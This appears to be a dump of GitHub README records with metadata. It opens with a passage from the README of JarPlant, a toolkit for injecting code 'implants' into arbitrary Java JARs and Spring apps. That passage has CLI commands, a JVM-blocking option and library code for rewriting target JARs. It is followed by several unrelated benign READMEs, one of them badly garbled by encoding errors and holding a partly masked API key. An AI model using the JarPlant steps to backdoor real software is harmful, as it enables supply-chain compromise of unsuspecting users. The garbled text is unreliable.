   --target path/to/target.jar \
   --implant-component SpringImplantController \
   --implant-config SpringImplantConfiguration 
````

You'll want to modify `StringImplantController.java` for this one do to anything interesting.
The default is to create a REST controller routed to `/implant` that just gives a dummy response.

Spike any JAR with your own custom implant code:

```shell
java -jar class-injector \
   --target path/to/target.jar \
   --implant ClassImplant 
```

Where your custom implant code resides in the `payload()` method of `ClassImplant.java`.

Spike any JAR with an implant that will always finish no matter what:

```shell
java -jar class-injector \
   --target path/to/target.jar \
   --implant ClassImplant
   --config CONF_BLOCK_JVM_SHUTDOWN=true 
```

Be careful with blocking operations in your payload code.

## Configuration

JarPlant supports injection of custom values with the implants.
A set of common configuration properties are defined with the template and built-in implants.
These are:

| Configuration property    | Data type | Description                                                                                                    | Default value     |
|---------------------------|-----------|----------------------------------------------------------------------------------------------------------------|-------------------|
| `CONF_JVM_MARKER_PROP`    | String    | JVM system property to create and use as a ""marker"" to determine if an implant has been detonated in this JVM. | `java.class.init` |
| `CONF_BLOCK_JVM_SHUTDOWN` | boolean   | Controls whether the implant's thread will block the JVM from fully exiting until the implant is done.         | `false`           |
| `CONF_DELAY_MS`           | int       | Optional delay (in milliseconds) before the implant payload will detonate.                                     | `0`               |

See the `ClassImplant` template Javadoc for mor info in these properties.

### Blocking the JVM exit

Be extra careful with the `CONF_BLOCK_JVM_SHUTDOWN` property.
If this is set to `true`, then the JVM will wait for your payload to finish its execution.
If your payload takes a long time, then the spiked app will fail to exit properly.
It's _not_ recommended to set a non-zero `CONF_DELAY_MS` value together with `CONF_BLOCK_JVM_SHUTDOWN=true`.

If you've injected an implant into an app that exits very quickly, then your payload may not get enough time to execute
if `CONF_BLOCK_JVM_SHUTDOWN` is set to `false` (which is the default setting).

As a general rule of thumb, only set `CONF_BLOCK_JVM_SHUTDOWN` to `true` if your implant is quick to execute and/or it's
absolutely essential that it _must_ finish.

For any target apps that takes some time to run (like a back-end service), there should be plenty time for your implant
to do its thing with `CONF_BLOCK_JVM_SHUTDOWN` set to its default value of `false`.

## Quickly implement a custom implant

For a one-off in a rush, the simplest and fastest way of getting your own custom Java code into a target JAR is to:

1) Clone this code repository.
2) Modify the `payload()` method inside `ClassImplant.java` with your own code.
3) Build JarPlant: `mvn clean package`.
4) Run the CLI. See the ""Quick grabs"" section above.

Alternatively, if you're spiking a Spring app: Modify the `SpringComponentImplant.java` (and maybe the
`SpringConfigurationImplant.java`) and use the `spring-injector` CLI accordingly.

## Using the JarPlant library

To invoke JarPlant from your own Java code, first run `mvn clean install` in the root directory of the JarPlant code
repository.
Then, include it in the `pom.xml` (or equivalent) of your own project:

```xml
<dependency>
  <groupId>io.github.w1th4d.jarplant</groupId>
  <artifactId>jarplant-lib</artifactId>
  <version>1.0-SNAPSHOT</version>
</dependency>
```

These coordinates _will be changed_ soon. It will also be published to Maven Central when it's properly released.

Example usage in your code:

```java
public class Demo {
    public static void main(String[] args) {
        try {
            ImplantHandler implant = ImplantHandlerImpl.findAndCreateFor(ClassImplant.class);
            implant.setConfig(""CONF_BLOCK_JVM_SHUTDOWN"", true);

            Path target = Path.of(""target.jar"");
            JarFiddler jar = JarFiddler.buffer(target);

            Injector injector = ClassInjector.createLoadedWith(implant);
            boolean succeeded = injector.injectInto(jar);
            if (succeeded) {
                jar.write(target);
            }
        } catch (ClassNotFoundException | IOException | ImplantException |
                 ImplantConfigException e) {
            throw new RuntimeException(e);
        }
    }
}
```

You may want to include the `jarplant-implants` submodule for access to `ClassImplant`:

```xml
<dependency>
  <groupId>io.github.w1th4d.jarplant</groupId>
    <artifactId>jarplant-implants</artifactId>
    <version>1.0-SNAPSHOT</version>
</dependency>
```

However, if you write your own code like this, it would be better to copy the `ClassImplant` template into your own
project and customize it according to your needs.
Give it a cool name while you're at it.

You may also introduce new configuration properties. Just make sure they're `public`, `static`, `volatile` and has a
name prefixed with `CONF_`.
If no default value is used for a property, then a value must be provided using `ImplantHandler.setConfig()` before
injection.

## Library components

JarPlant is written as a Java library and framework for you to write your own implants.

There are a number of key components to JarPlant. These are `ImplantHandler`, `JarFiddler` and `Injector`.

### ImplantHandler

This class (its implementation `ImplantHandlerImpl`) is used to find, load and configure implants.

This API is subject to change soon.

### JarFiddler

This class is used to read, modify and write a JAR file.

The default implementation will read and buffer the contents of an entire JAR into memory.
The injectors can then operate upon the `JarFiddler` in-memory.
The user of the JarPlant API is expected to invoke the `write()` method if the injector succeeds.

### Injectors

These are the classes that does most of the bytecode manipulation of classes inside a JAR.

There are different implementations for various types of JARs/apps: `ClassInjector` and `SpringInjector`.

#### ClassInjector

Operates upon any JAR file containing arbitrary classes.
The JAR does _not_ have to be executable or contain a class with a `public static void main(String[] args)` function.
Any class will do. This works for libraries and dependencies, too.

When the target JAR is run or used by another app, the implant will trigger.

#### SpringInjector

Specifically looks for a Spring configuration classes and injects a Spring component in the same package namespace.
If _component scanning_ is not enabled by the target app, then the SpringInjector will also inject a `@Bean`-annotated
method in the configuration in order to reference the implanted component.

The Spring implant template will register a new HTTP request mapping for the app.
Requests going to that endpoint (`/implant` by default) will be handled by the implant.
You're encouraged to modify `SpringComponentImplant.java` with your own custom code.

## Implants

JarPlant is intended to serve as a framework for developers to implement their own implants.

The template for the `ClassInjector` is `ClassImplant`.
Please delve into it, read its Javadoc and fill in the `payload()` method appropriately.

The `SpringInjector` uses two different implants: A _Spring component_ implant and a _Spring configuration_ implant.
Both needs to be supplied and maintained, but the `SpringInjector` may skip the Spring configuration implant if it's not
necessary.
Future versions may (hopefully) be able to generate the Spring configuration implant during injection, but it needs to
be supplied explicitly for now.

## Maven modules

This project is divided into a set of Maven modules:

* **jarplant-cli** is where the executable main function is. It gives the user a Command Line Interface to use the
  JarPlant functionality in a user-friendly way.
* **jarplant-implants** is where the various example implants are located. A savvy user is encouraged to write custom
  implants as appropriate.
* **jarplant-lib** is where the main functionality is. This module is designed to contain only the essential
  functionality for portability.
* **test-app-pojo** is a very minimal plain Java app that can be used for test the class implants.
* **test-app-spring-simple** is a simple Spring Boot application for testing the Spring implants.
  It's just a `@SpringBootApplication` with one configuration and controller.
* **test-app-spring-complex** tries to simulate a more intricate Spring app with several `@Configuration` classes in
  different sub-packages. It includes configurations without component scanning enabled, several configurations in
  the same package and other exotic cases worth testing for.
* **test-implant-class** and **test-implant-spring** are used internally for tests.

## Test suite

Testing JAR and bytecode manipulation can be a bit tricky. Please try to include any bug or corner case into its own
Junit test. Don't be afraid of adding to the test apps and test implants, just don't break any other tests in the
process. Add a new submodule with a test app/implant that narrows in on the test case if necessary. *Don't* check in
a blob like a JAR file or anything. Any test apps needs to be provided by source and pom. Try to keep it to the point.

### Test automation

Most tests reside in `jarplant-lib/src/test` that houses a mix of unit tests and end-to-end tests.
The tests use a combination of dummy classes and ""live samples"" from the other Maven submodules.
These submodules are set up to build a proper JAR file and then copy it into the resource folder of the tests.
See their `pom.xml` files for details. It's a bit out of the ordinary and may generate some warnings in Maven.  
Just make sure to run `mvn package` in the project root before running any tests in isolation.

The tests in `jarplant-lib` are a mix of unit tests and end-to-end tests.

### Manual testing and troubleshooting

When developing JarPlant or its implants, it's been very useful to use the `javap` tool provided with the JVM.

Example:

```
mkdir /tmp/jarplant-debug
cd /tmp/jarplant-debug
unzip ../path/to/jarfile/my-app.jar

javap -c -v io/github/w1th4d/jarplant/test/Main.class | less
```

Replace directories and paths as appropriate. The key here is the `javap` command. It's great for disassembling and
peaking into the JVM bytecode. Do this before and after a JarPlant run and investigate the diffs.

Consider to use the manual testing procedure as a tool to narrow down on a bug and then express that bug as a Junit
test. That way, it's easy for someone to fix the bug by satisfying the test. Alternatively, just fix the bug and create
a PL. You can always just create a GitHub Issue to explain the problem if you're unable to express it as a test or fix
it yourself. A reported Issue is better than nothing.

## Future work

There's a lot of work that still needs to be done. See the Issues section on GitHub for more details.

One key point about future work is that *a lot* more testing needs to be done.
We know that JarPlant in its current state will fail to spike many JARs in the wild.
We're also concerned about compatibility between different Java versions.
All of this needs to be set up with test automation.

",0,0,1,12.0,"['java', 'archive', 'implant', 'toolkit', 'quickstart', 'quick', 'grab', 'configuration', 'block', 'jvm', 'exit', 'quickly', 'implement', 'custom', 'implant', 'use', 'jarplant', 'library', 'library', 'component', 'implanthandler', 'jarfiddler', 'injector', 'classinjector', 'springinjector', 'implant', 'maven', 'module', 'test', 'suite', 'test', 'automation', 'manual', 'testing', 'troubleshooting', 'future', 'work']","['implant', 'library', 'test', 'java', 'archive']",9.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-jar-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,8.0,1.0
crystoll/musashi,main,"# Spring AI demos

These are the Spring AI/OpenAI demos shown in DevXplaining Youtube channel.

<https://www.youtube.com/c/DevXplaining>

If you want to run these codes you need to set up your OpenAI API key to environment variables first.

```bash
export OPEN_AI_API_KEY=your_openai_api_key
```

Then you can run the demos with Maven.

```bash
mvn spring-boot:run
```

REST API will be available at `http://localhost:8080`. Two demos are in:

<http://localhost:8080/robobrain/musashi>
<http://localhost:8080/robobrain/rag>

For PDF reading example source is TIOBE.pdf that's simply a snapshot of TIOBE index page at <http://www.tiobe.com/tiobe-index/>
",0,0,1,0.0,"['spring', 'ai', 'demo']","['spring', 'ai', 'demo']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
HaHaWTH/AdvancedSensitiveWords,pro,"# AdvancedSensitiveWords
If you trigger the sensitive word test you'll be penalised.
One-stop-shop **ultimate** anti-swear solution for your Minecraft server!

![](https://socialify.git.ci/HaHaWTH/AdvancedSensitiveWords/image?description=1&descriptionEditable=One-stop-shop%20ultimate%20anti-swear%20solution%20for%20Minecraft&font=Inter&language=1&name=1&stargazers=1&theme=Auto)

[![Available on SpigotMC](https://img.shields.io/badge/Available%20on%20SpigotMC-orange?style=for-the-badge&logo=SpigotMC&logoColor=FFFFFF)](https://www.spigotmc.org/resources/advancedsensitivewords.115484/)

<p align=""center"">
  <img src=""logo.webp"" alt=""logo"" width=""128"" height=""128""/>
</p>

Logo designed by GPT-4

[![CodeFactor](https://www.codefactor.io/repository/github/hahawth/advancedsensitivewords/badge)](https://www.codefactor.io/repository/github/hahawth/advancedsensitivewords)
[![QQ](https://img.shields.io/badge/QQ-361581545-blue)](https://qm.qq.com/q/sC52yJDrGi)

## Features
1. Using DFA(Deterministic Finite Automata) algorithm
2. Plug-and-play
3. Huge and high-quality default dictionary (Over 60,000 words)
4. Blazing fast by using packets (32,000+ queries per second on a 2-core server)
5. 100% compatibility with chat plugins (Tested over 30+ plugins)
6. Full-customizable
7. Sign check support
8. Anvil check support
9. Book check support
10. Player name check support
11. **Chat context check**
12. **Sign multiple lines check**
13. **Book check with ignore lines support and cache**
14. Bedrock player compatibility
15. Compatibility with main stream login plugins (AuthMe, CatSeedLogin etc.)
16. Emoji and other unicode support
17. Chinese support
18. Fast processing depending on our custom data structure
19. Online sensitive word list support ([Repository here](https://github.com/HaHaWTH/ASW-OnlineWordList))
20. Folia supported
21. OP notifications on player swore
22. Custom punishments (Effect, command, hostile, etc.)
23. Fake message support (Inspired by [Bilibili Avalon System](https://github.com/freedom-introvert/Research-on-Avalon-System-in-Bilibili-Comment-Area))
24. PlaceHolder API expansion support
25. AI powered moderation system

**Features above make us unique in the anti-swear plugins!**

## How does this plugin work?

```mermaid
graph TD
    A[Player Interaction] --> B[Event Listeners]
    C[Player Packet] --> D[Packet Listeners]
    B --> E[Regex Preprocess]
    D --> E[Regex Preprocess]
    E --> F[DFA Match]
    F -->|Matched| G[Result]
    G --> J[Replace]
    G --> K[Cancel]
    F -->|Not Matched| H[AI Processor]
    H -->|LLMs| I[Rating]
    I --> L[Punish]
```

## Commands

`/asw help` - Show help message

`/asw reload` - Re-initialize the DFA dict and reload configurations

`/asw status` - Show the status of the AdvancedSensitiveWords

`/asw test <text>` - Test the AdvancedSensitiveWords filter with given text

`/asw info <player>` - Check total violations of specific player from database

`/asw punish <player> [type]` - Punish a player with a specific type

## Permissions

`advancedsensitivewords.bypass` - Bypass the AdvancedSensitiveWords message filter

`advancedsensitivewords.reload` - Allows you to use the /asw reload command

`advancedsensitivewords.status` - Allows you to use the /asw status command

`advancedsensitivewords.test` - Allows you to use the /asw test command

`advancedsensitivewords.help` - Allows you to use the /asw help command

`advancedsensitivewords.notice` - Retrieve the notification when players swore

`advancedsensitivewords.info` - Ability to use /asw info command

`advancedsensitivewords.update` - Receive update notifications

`advancedsensitivewords.punish` - Allows you to use the /asw punish command

**For more info, please visit [our Wiki](https://github.com/HaHaWTH/AdvancedSensitiveWords/wiki)**

## Supported Platforms
- Spigot(stable)
- Velocity(stable)
- BungeeCord(stable)
- Sponge(WIP)
- Fabric(Planned)
- Forge/NeoForge(Coming sâˆn)

## Known Incompatibilities
- [HuskChat (Only proxy mode)](https://github.com/WiIIiam278/HuskChat)

## Statistics
[![](https://img.shields.io/bstats/servers/20661?label=Spigot%20Servers&style=for-the-badge)](https://bstats.org/plugin/bukkit/AdvancedSensitiveWords/20661)

[![](https://img.shields.io/bstats/players/20661?label=Online%20Players&style=for-the-badge)](https://bstats.org/plugin/bukkit/AdvancedSensitiveWords/20661)

## Open-source projects used
- **[Ollama4j(Modified to support Java 8)](https://github.com/ollama4j/ollama4j)**
- **[OpenAI4j](https://github.com/ai-for-java/openai4j)**
- **[packetevents(Used for handling chat & book packets)](https://github.com/retrooper/packetevents)**
",12,0,3,3.0,"['advancedsensitivewords', 'feature', 'how', 'plugin', 'work', 'command', 'permission', 'support', 'platform', 'know', 'incompatibility', 'statistic', 'project', 'use']","['advancedsensitivewords', 'feature', 'how', 'plugin', 'work']",5.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-shade-plugin,org.codehaus.mojo:templating-maven-plugin,org.jetbrains.kotlin:kotlin-maven-plugin,pl.project13.maven:git-commit-id-plugin]",0.0,4.0,1.0
tzolov/playground-flight-booking,main,"# AI powered expert system demo

Spring AI re-implementation of https://github.com/marcushellberg/java-ai-playground

This app shows how you can use [Spring AI](https://github.com/spring-projects/spring-ai) to build an AI-powered system that:

- Has access to terms and conditions (retrieval augmented generation, RAG)
- Can access tools (Java methods) to perform actions (Function Calling)
- Uses an LLM to interact with the user

![alt text](diagram.jpg)

## Requirements

- Java 17+
- OpenAI API key in `OPENAI_API_KEY` environment variable

## Running

Run the app by running `Application.java` in your IDE or `mvn` in the command line.

### With OpenAI Chat

Add to the POM the Spring AI Open AI boot starter:

```xml
<dependency>
    <groupId>org.springframework.ai</groupId>
    <artifactId>spring-ai-openai-spring-boot-starter</artifactId>
</dependency>
```

Add the OpenAI configuraiton to the `applicaiton.properties`:

```
spring.ai.openai.api-key=${OPENAI_API_KEY}
spring.ai.openai.chat.options.model=gpt-4o
```

### WIth VertexAI Geminie Chat

Add to the POM the Spring AI VertexAI Gemeni and Onnx Transfomer Embedding boot starters:

```xml
<dependency>
    <groupId>org.springframework.ai</groupId>
    <artifactId>spring-ai-vertex-ai-gemini-spring-boot-starter</artifactId>
</dependency>

<dependency>
    <groupId>org.springframework.ai</groupId>
    <artifactId>spring-ai-transformers-spring-boot-starter</artifactId>
</dependency>
```

Add the VertexAI Gemini configuraiton to the `applicaiton.properties`:

```
spring.ai.vertex.ai.gemini.project-id=${VERTEX_AI_GEMINI_PROJECT_ID}
spring.ai.vertex.ai.gemini.location=${VERTEX_AI_GEMINI_LOCATION}
spring.ai.vertex.ai.gemini.chat.options.model=gemini-1.5-pro-001
# spring.ai.vertex.ai.gemini.chat.options.model=gemini-1.5-flash-001
```

### With Azure OpenAI Chat

Add to the POM the Spring AI Azure OpenAI boot starter:

```xml
<dependency>
    <groupId>org.springframework.ai</groupId>
    <artifactId>spring-ai-azure-openai-spring-boot-starter</artifactId>
</dependency>
```

Add the Azure OpenAI configuraiton to the `applicaiton.properties`:

```
spring.ai.azure.openai.api-key=${AZURE_OPENAI_API_KEY}
spring.ai.azure.openai.endpoint=${AZURE_OPENAI_ENDPOINT}
spring.ai.azure.openai.chat.options.deployment-name=gpt-4o
```

### With Groq Chat

It reuses the OpenAI Chat client but ponted to the Groq endpont

Add to the POM the Spring AI Open AI boot starter:

```xml
<dependency>
    <groupId>org.springframework.ai</groupId>
    <artifactId>spring-ai-openai-spring-boot-starter</artifactId>
</dependency>
<dependency>
    <groupId>org.springframework.ai</groupId>
    <artifactId>spring-ai-transformers-spring-boot-starter</artifactId>
</dependency>
```

Add the Groq configuraiton to the `applicaiton.properties`:

```
spring.ai.openai.api-key=${GROQ_API_KEY}
spring.ai.openai.base-url=https://api.groq.com/openai
spring.ai.openai.chat.options.model=llama3-70b-8192
```

### With Anthropic Claude 3 Chat

Add to the POM the Spring AI Anthropic Claude and Onnx Transfomer Embedding boot starters:

```xml
<dependency>
    <groupId>org.springframework.ai</groupId>
    <artifactId>spring-ai-anthropic-spring-boot-starter</artifactId>
</dependency>

<dependency>
    <groupId>org.springframework.ai</groupId>
    <artifactId>spring-ai-transformers-spring-boot-starter</artifactId>
</dependency>
```

Add the Anthropic configuraiton to the `applicaiton.properties`:

```
spring.ai.anthropic.api-key=${ANTHROPIC_API_KEY}
spring.ai.openai.chat.options.model=llama3-70b-8192
spring.ai.anthropic.chat.options.model=claude-3-5-sonnet-20240620
```


## Build Jar

```shell
./mvnw clean install -Pproduction
```

```shell
java -jar ./target/playground-flight-booking-0.0.1-SNAPSHOT.jar
```


```
docker run -it --rm --name postgres -p 5432:5432 -e POSTGRES_USER=postgres -e POSTGRES_PASSWORD=postgres ankane/pgvector
```",0,2,7,1.0,"['ai', 'power', 'expert', 'system', 'demo', 'requirement', 'run', 'with', 'openai', 'chat', 'with', 'vertexai', 'geminie', 'chat', 'with', 'azure', 'openai', 'chat', 'with', 'groq', 'chat', 'with', 'anthropic', 'claude', 'chat', 'build', 'jar']","['with', 'chat', 'openai', 'ai', 'power']",1.0,"[com.vaadin:vaadin-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
dflib/jjava,main,"# JJava

JJava is a Java kernel for [Jupyter](http://jupyter.org/) maintained by the [DFLib.org](https://dflib.org) community. 
The kernel executes code via the JShell tool. Some of the additional commands are supported via a syntax similar to IPython magics. 

_JJava is an evolution of the earlier [IJava kernel](https://github.com/SpencerPark/IJava), that is no longer maintained by its authors._

## Requirements

1.  Java 11 or newer
2.  Python and a Jupyter-like environment to use the kernel in.

## Installation

_More detailed instructions are available in the [documentation](https://dflib.org/jjava/docs/1.x/#_installation)._

1.  Download the release from the [releases tab](https://github.com/dflib/jjava/releases).
2.  Unzip it into a temporary location.
3.  Run the `install.py` script with the same version of Python as used by Jupyter.

## Project Links

* [Website](https://dflib.org/)
* [Documentation](https://dflib.org/jjava/docs/1.x/)
* [Discussions and Support Forum](https://github.com/dflib/jjava/discussions)
* [Bug reports and feature requests](https://github.com/dflib/jjava/issues)

",3,9,4,13.0,"['jjava', 'requirement', 'installation', 'project', 'link']","['jjava', 'requirement', 'installation', 'project', 'link']",4.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,3.0,1.0
wisemapping/wisemapping-open-source,develop,"# WiseMapping Open Source

WiseMapping is an open-source web-based mind mapping tool that harnesses the potential of Mind Maps by blending together open standards technologies like SVG and React. It is built upon the foundation of the code supporting http://www.wisemapping.com, ensuring reliability and continuity in its development.

# Build and Start Application

The following section describes the steps to check out, compile, and start WiseMapping locally. If you are interested in deploying it, I recommend using the already published images https://hub.docker.com/r/wisemapping/wisemapping.

## Prerequisites

    * JDK 21 or higher
    * Maven v3.x or higher ([http://maven.apache.org/])
    * Yarn v1 or higher
    * Node v18 or higher

## Option 1: Quick Start with Docker Compose

The following command line will start WiseMapping locally using HSQLDB in memory for development purposes:

```
$ mvn -f wise-api/pom.xml package
$ docker compose up --build
```

Application will start at http://localhost/c/login. You can login using *test@wisemapping.org* and password *test*

## Option 2: Start Frontend and Backend API

### Compile and Start API

```
$ mvn -f wise-api/pom.xml package
$ cd wise-api
$ mvn spring-boot:run
```

### Compile and Start Frontend

You need to checkout https://github.com/wisemapping/wisemapping-frontend first. Then, follow the next steps:

```
$ export NODE_OPTIONS=--openssl-legacy-provider
$ export APP_CONFIG_TYPE=""file:dev""

$ cd wisemapping-frontend
$ yarn install 
$ yarn build

$ cd packages/webapp; yarn start
```
Application will start at http://localhost:3000/c/login. You can login using *test@wisemapping.org* and password *test*

# Supportability Matrix

## Databases

* MySQL v8 or higher
* PostgreSQL v15 or higher
* Hsqldb v2.7 or higher

# Configuration

WiseMapping backend is based on SpringBoot v3 and it's highly customizable. Additional documentation can be found [here](https://docs.spring.io/spring-boot/3.3/reference/features/external-config.html)

The perfered option is to extended by overwriting [application.yaml](https://github.com/wisemapping/wisemapping-open-source/blob/develop/wise-api/src/main/resources/application.yml)

```
$ java -jar target/wisemapping-api.jar --spring.config.additional-location=../../wise-conf/app.yml
```

For example, this [example](https://github.com/wisemapping/wisemapping-open-source/blob/develop/config/database/postgresql/app-postgresql.yaml) configure PostgreSQL as database.

# Members

## Founders

   * Paulo Veiga <pveiga@wisemapping.com>
   * Pablo Luna <pablo@wisemapping.com>

## Past Individual Contributors

   * Ignacio Manzano  
   * Ezequiel Bergamaschi <ezequielbergamaschi@gmail.com>
   
## License

The source code is Licensed under the WiseMapping Open License, Version 1.0 (the â€œLicenseâ€);
You may obtain a copy of the License at: [https://github.com/wisemapping/wisemapping-open-source/blob/develop/LICENSE.md](https://github.com/wisemapping/wisemapping-open-source/blob/develop/LICENSE.md)

",0,6,2,1.0,"['wisemapping', 'open', 'source', 'build', 'start', 'application', 'prerequisite', 'option', 'quick', 'start', 'docker', 'compose', 'option', 'start', 'frontend', 'backend', 'api', 'compile', 'start', 'api', 'compile', 'start', 'frontend', 'supportability', 'matrix', 'database', 'configuration', 'member', 'founder', 'past', 'individual', 'contributor', 'license']","['start', 'option', 'frontend', 'api', 'compile']",1.0,"[org.apache.maven.plugins:maven-surefire-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
Jckf/DH-Support,develop,"# Server-side support for [Distant Horizons](https://gitlab.com/jeseibel/distant-horizons)

DH Support is a Bukkit/Spigot/Paper/Folia server plugin that transmits Level Of Detail (LOD) data to players with Distant Horizons installed. Distant Horizons _will_ work fine without this plugin, but then each client will have to be within normal view distance of chunks to load them, and they will not receive updates for distant chunks when they change. 

## Installation

Download the [latest release](https://github.com/Jckf/DH-Support/releases) and drop the JAR in your plugins folder, and you're done!

## Configuration

The default values should be pretty solid, but you may tweak them to better suit your specific needs. Everything you need to know should be in config.yml.

## Building

The project uses Maven, so just run `mvn` in the project directory to compile and package a new JAR.

## Contribution

There are several ways to contribute to this project. You can offer your feedback on [the DH Discord](https://discord.gg/xAB8G4cENx) in [this thread](https://discord.com/channels/881614130614767666/1154490009735417989), report any issues or bugs you find, attack an open issue and submit a pull request, or even [leave a donation](https://ko-fi.com/jimckf) â¤ï¸

![Plugin usage statistics](https://bstats.org/signatures/bukkit/DH%20Support.svg)
",6,8,2,32.0,"['support', 'distant', 'horizon', 'http', 'installation', 'configuration', 'building', 'contribution']","['support', 'distant', 'horizon', 'http', 'installation']",1.0,[],0.0,1.0,0.0
1321928757/chatglm-sdk-java,master,"# æ™ºè°±Aiå¤§æ¨¡å‹å¼€æ”¾SDK - By åˆ˜ä»•æ°

ä¸ºäº†è®©ç ”å‘ä¼™ä¼´æ›´å¿«ï¼Œæ›´æ–¹ä¾¿çš„æ¥å…¥ä½¿ç”¨æ™ºè°±Aiå¤§æ¨¡å‹ã€‚ä»è€Œå¼€å‘çš„ chatglm-sdk-java ä¹Ÿæ¬¢è¿ğŸ‘ğŸ»å¤§å®¶åŸºäºæ™ºè°±APIæ¥å£è¡¥å……éœ€è¦çš„åŠŸèƒ½ã€‚

æ­¤SDKè®¾è®¡ï¼Œä»¥ Session ä¼šè¯æ¨¡å‹ï¼Œæä¾›å·¥å‚ğŸ­åˆ›å»ºæœåŠ¡ã€‚ä»£ç éå¸¸æ¸…æ™°ï¼Œæ˜“äºæ‰©å±•ã€æ˜“äºç»´æŠ¤ã€‚(https://www.zhipuai.cn/)ã€‚

---

>**ä½œè€…**ï¼šLuckySJ-åˆ˜ä»•æ° - åœ¨çº¿ä½“éªŒåœ°å€ [**www.luckysj.online**](https://www.luckysj.online/)

## ğŸ‘£ç›®å½•

1. ç»„ä»¶é…ç½®
2. åŠŸèƒ½æµ‹è¯•
   1. ä»£ç æ‰§è¡Œ - `ä½¿ç”¨ï¼šä»£ç çš„æ–¹å¼ä¸»è¦ç”¨äºç¨‹åºæ¥å…¥`
   2. è„šæœ¬æµ‹è¯• - `æµ‹è¯•ï¼šç”ŸæˆTokenï¼Œç›´æ¥é€šè¿‡HTTPè®¿é—®AiæœåŠ¡`
3. ç¨‹åºæ¥å…¥

## 1. ç»„ä»¶é…ç½®

- ç”³è¯·ApiKeyï¼š[https://open.bigmodel.cn/usercenter/apikeys](https://open.bigmodel.cn/usercenter/apikeys) - æ³¨å†Œç”³è¯·å¼€é€šï¼Œå³å¯è·å¾— ApiKey
- è¿è¡Œç¯å¢ƒï¼šJDK 1.8+
- maven pom - `æœªæ¨é€åˆ°Mavenä¸­å¤®ä»“åº“ï¼Œéœ€è¦ä¸‹è½½ä»£ç æœ¬åœ° install åä½¿ç”¨`

## 2. åŠŸèƒ½æµ‹è¯•

### 2.1 ä»£ç æ‰§è¡Œ

```java
@Slf4j
public class ApiTest {

    private OpenAiSession openAiSession;

    @Before
    public void test_OpenAiSessionFactory() {
        // 1. é…ç½®æ–‡ä»¶
        Configuration configuration = new Configuration();
        configuration.setApiHost(""https://open.bigmodel.cn/"");
        configuration.setApiSecretKey(""4e087e4135306ef4a676f0cce3cee560.sgP2*****"");
        // 2. ä¼šè¯å·¥å‚
        OpenAiSessionFactory factory = new DefaultOpenAiSessionFactory(configuration);
        // 3. å¼€å¯ä¼šè¯
        this.openAiSession = factory.openSession();
    }

    /**
     * æµå¼å¯¹è¯
     */
    @Test
    public void test_completions() throws JsonProcessingException, InterruptedException {
        // å…¥å‚ï¼›æ¨¡å‹ã€è¯·æ±‚ä¿¡æ¯
        ChatCompletionRequest request = new ChatCompletionRequest();
        request.setModel(Model.CHATGLM_LITE); // chatGLM_6b_SSEã€chatglm_liteã€chatglm_lite_32kã€chatglm_stdã€chatglm_pro
        request.setPrompt(new ArrayList<ChatCompletionRequest.Prompt>() {
            private static final long serialVersionUID = -7988151926241837899L;

            {
                add(ChatCompletionRequest.Prompt.builder()
                        .role(Role.user.getCode())
                        .content(""å†™ä¸ªjavaå†’æ³¡æ’åº"")
                        .build());
            }
        });

        // è¯·æ±‚
        openAiSession.completions(request, new EventSourceListener() {
            @Override
            public void onEvent(EventSource eventSource, @Nullable String id, @Nullable String type, String data) {
                ChatCompletionResponse response = JSON.parseObject(data, ChatCompletionResponse.class);
                log.info(""æµ‹è¯•ç»“æœ onEventï¼š{}"", response.getData());
                // type æ¶ˆæ¯ç±»å‹ï¼Œadd å¢é‡ï¼Œfinish ç»“æŸï¼Œerror é”™è¯¯ï¼Œinterrupted ä¸­æ–­
                if (EventType.finish.getCode().equals(type)) {
                    ChatCompletionResponse.Meta meta = JSON.parseObject(response.getMeta(), ChatCompletionResponse.Meta.class);
                    log.info(""[è¾“å‡ºç»“æŸ] Tokens {}"", JSON.toJSONString(meta));
                }
            }

            @Override
            public void onClosed(EventSource eventSource) {
                log.info(""å¯¹è¯å®Œæˆ"");
            }
        });

        // ç­‰å¾…
        new CountDownLatch(1).await();
    }

}
```

- è¿™æ˜¯ä¸€ä¸ªå•å…ƒæµ‹è¯•ç±»ï¼Œä¹Ÿæ˜¯æœ€å¸¸ä½¿ç”¨çš„æµå¼å¯¹è¯æ¨¡å¼ã€‚

### 2.2 è„šæœ¬æµ‹è¯•

```java
@Test
public void test_curl() {
    // 1. é…ç½®æ–‡ä»¶
    Configuration configuration = new Configuration();
    configuration.setApiHost(""https://open.bigmodel.cn/"");
    configuration.setApiSecretKey(""4e087e4135306ef4a676f0cce3cee560.sgP2D****"");
    // 2. è·å–Token
    String token = BearerTokenUtils.getToken(configuration.getApiKey(), configuration.getApiSecret());
    log.info(""1. åœ¨æ™ºè°±Aiå®˜ç½‘ï¼Œç”³è¯· ApiSeretKey é…ç½®åˆ°æ­¤æµ‹è¯•ç±»ä¸­ï¼Œæ›¿æ¢ setApiSecretKey å€¼ã€‚ https://open.bigmodel.cn/usercenter/apikeys"");
    log.info(""2. è¿è¡Œ test_curl è·å– tokenï¼š{}"", token);
    log.info(""3. å°†è·å¾—çš„ token å€¼ï¼Œå¤åˆ¶åˆ° curl.sh ä¸­ï¼Œå¡«å†™åˆ° Authorization: Bearer åé¢"");
